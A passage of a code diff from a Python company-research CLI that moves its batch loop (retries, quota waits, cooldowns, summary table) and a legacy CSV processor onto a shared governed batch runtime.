-        # until the bounded attempts ran out - record a failure. Otherwise the
-        # company is silently dropped and the batch summary can report success
-        # (failed_count == 0) despite producing no report for it.
-        if len(results) == results_len_before:
-            console.error(
-                f"  {company_name}: exhausted retries without completing - recording failure"
-            )
-            results.append(
-                {
-                    "company": company_name,
-                    "status": "failed",
-                    "path": None,
-                    "size_kb": 0,
-                    "error": "exhausted retries (billing/quota not recovered)",
-                }
-            )
-            consecutive_failures += 1
-
-        # Billing stop - the inner loop broke because user chose to stop
-        last_result = results[-1] if results else None
-        if last_result and last_result.get("error") == "billing exhausted - stopped by user":
-            break
-
-        # Consecutive failure handling - likely quota exhaustion
-        if consecutive_failures >= max_consecutive_failures:
-            console.error(
-                f"\n  {max_consecutive_failures} consecutive failures - possible API quota exhaustion."
-            )
-            if skip_confirm:
-                console.info(f"  Auto-waiting {billing_wait_minutes}min before continuing...")
-                _time.sleep(billing_wait_minutes * 60)
-                consecutive_failures = 0
-            else:
-                console.info(f"  [w] Wait {billing_wait_minutes} minutes and continue")
-                console.info("  [s] Stop batch and show summary")
-                resp = input("  Choice [w/s]: ").strip().lower()
-                if resp == "w":
-                    console.info(f"  Waiting {billing_wait_minutes}min for quota recovery...")
-                    _time.sleep(billing_wait_minutes * 60)
-                    consecutive_failures = 0
-                else:
-                    console.info("  Batch stopped by user.")
-                    console.info("  Re-run the same command to retry failed companies.")
-                    break
-
-        # Check overall error rate (after at least 3 new attempts). Count all
-        # failures rather than slicing results[skipped_existing:] - resumed and
-        # freshly-processed companies interleave in company order, so the slice
-        # miscounted. Resumed entries are always status "ok", so every "failed"
-        # entry is a new attempt.
-        new_attempted = len(results) - skipped_existing
-        new_failed = sum(1 for r in results if r["status"] == "failed")
-        if new_attempted >= 3 and new_failed > new_attempted / 2:
-            console.warn(f"  High failure rate: {new_failed}/{new_attempted} failed so far")
-
-        # Cooldown between companies after any completed attempt (ok or warning)
-        # Scale cooldown by mode: scrape is lighter on APIs than deep/full
-        completed = any(
-            r["company"] == company_name and r["status"] in ("ok", "warning") for r in results
-        )
-        if completed and i < total:
-            cooldown = 10 if mode == "scrape-only" else 60
-            remaining = total - i
-            console.info(
-                f"  Cooling down {cooldown}s before next company ({remaining} remaining)..."
-            )
-            _time.sleep(cooldown)
-
-    # Summary
-    succeeded = sum(1 for r in results if r["status"] == "ok")
-    warnings_count = sum(1 for r in results if r["status"] == "warning")
-    failed_count = sum(1 for r in results if r["status"] in ("failed", "skipped"))
-
-    console.blank()
-    console.banner("Batch Summary")
-    if skipped_existing:
-        console.info(f"  ({skipped_existing} already completed, resumed from where we left off)")
-        console.blank()
-    console.info(f"  {'#':>3}  {'Company':<35} {'Status':<10} {'Size':>8}  Notes")
-    console.info(f"  {'---':>3}  {'-' * 35} {'-' * 10} {'-' * 8}  {'-' * 20}")
-    for i, r in enumerate(results, 1):
-        status_icon = {"ok": "ok", "warning": "!!", "failed": "FAIL", "skipped": "SKIP"}[
-            r["status"]
-        ]
-        size_str = f"{r['size_kb']:.0f}KB" if r["size_kb"] else "-"
-        note = r["error"] or ""
-        c = r["company"][:33] + ".." if len(r["company"]) > 35 else r["company"]
-        console.info(f"  {i:>3}  {c:<35} {status_icon:<10} {size_str:>8}  {note}")
-
-    console.blank()
-    if failed_count == 0:
-        console.success_box(f"All {succeeded} reports generated", "Batch complete")
-    else:
-        console.success_box(
-            f"Batch complete: {succeeded} ok, {warnings_count} warnings, {failed_count} failed",
-            f"{succeeded + warnings_count}/{len(results)} usable reports",
-        )
-    if failed_count > 0:
-        console.info("Re-run the same command to retry failed companies.")
-
-    return 0 if failed_count == 0 else 1
+    return run_governed_batch(
+        file_path,
+        mode=mode,
+        citation_style=citation_style,
+        ai_strategy=ai_strategy,
+        platforms=platforms,
+        industry=industry,
+        limit=limit,
+        skip_confirm=skip_confirm,
+        dry_run=dry_run,
+        json_output=json_output,
+        per_company_estimate=per_company_estimate,
+        mode_label=mode_label,
+        output_dir=output_dir,
+        strategies=strategies,
+        no_qa=no_qa,
+        max_scrape_time=max_scrape_time,
+        lite_strategy=lite_strategy,
+        fast_mode=fast_mode,
+        premium_mode=premium_mode,
+        skip_scrape_validation=skip_scrape_validation,
+        verify=verify,
+        grok_tier=grok_tier,
+        skip_recon=skip_recon,
+        continuous_reasoning=continuous_reasoning,
+        budget_usd=budget_usd,
+        execution_preflight=execution_preflight,
+        deprecated_alias=deprecated_alias,
+        research_runner=perform_research,
+    )
 
 
 def process_csv(
@@ -3316,31 +2952,19 @@ def process_csv(
     ai_strategy: bool = True,
     platforms: tuple[str, ...] | None = None,
 ) -> None:
-    """Process a CSV file for batch research."""
-    import csv
-
+    """Retain the legacy name while using the governed batch approval path."""
+    from primr.core.cli_batch_runtime import process_batch as run_governed_batch
     from primr.core.research_agent import perform_research
 
-    console.header("Batch Processing", file_path)
-    console.info(f"Mode: {mode}")
-
-    with open(file_path, encoding="utf-8") as f:
-        reader = csv.DictReader(f)
-        for row in reader:
-            company = row.get("company_name", "").strip()
-            website = row.get("website", "").strip()
-            if company or website:
-                try:
-                    perform_research(
-                        company,
-                        _ensure_valid_url(website) if website else None,
-                        mode=mode,
-                        citation_style=citation_style,
-                        ai_strategy=ai_strategy,
-                        platforms=platforms,
-                    )
-                except Exception as e:
-                    console.error(f"Failed: {company or website} - {e}")
+    run_governed_batch(
+        file_path,
+        mode=mode,
+        citation_style=citation_style,
+        ai_strategy=ai_strategy,
+        platforms=platforms,
+        skip_confirm=False,
+        research_runner=perform_research,
+    )
 
 
 def open_file(filepath: str) -> None:
